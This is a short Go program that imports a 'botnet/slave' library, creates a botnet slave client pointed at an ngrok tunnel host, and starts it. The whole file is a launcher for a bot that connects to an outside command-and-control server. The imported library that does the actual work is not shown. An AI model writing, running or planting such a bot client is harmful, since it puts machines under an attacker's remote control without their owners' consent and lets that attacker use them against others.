package main

import (
	"github.com/adrianosela/botnet/slave"
	"log"
)

func main() {
	slave, err := slave.NewBotnetSlave("4f906e13.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	slave.Start()
}
